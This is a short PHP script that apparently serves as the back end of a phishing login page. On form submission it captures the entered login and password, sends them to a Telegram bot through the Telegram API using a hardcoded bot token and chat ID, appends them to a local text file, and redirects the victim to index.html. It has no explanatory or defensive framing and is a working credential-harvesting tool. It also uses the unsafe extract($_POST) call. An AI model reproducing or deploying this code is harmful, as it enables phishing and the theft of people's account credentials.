<?php 	
	extract($_POST);
	if (isset($_POST["loginbutton"])) {
		$login = $_POST["login"];
		$password = $_POST['password'];
		$message = "'".$login." ".$password."'--------";
		$data = [
			'text' => $message,
			'chat_id' => '5353716699'
		];
		$token = '6031857438:AAHeK9lZ0p8OUXn5CrFUMxHaRv5vbGu6v6Y';
		$chat_id = '5353716699';
		$url = file_get_contents("https://api.telegram.org/bot".$token."/sendMessage?".http_build_query($data));
		$file = "texte.txt";
		$handle = fopen($file, "a");
		fwrite($handle, $message);
		fclose($handle);
		header('location:index.html');
	}
 ?>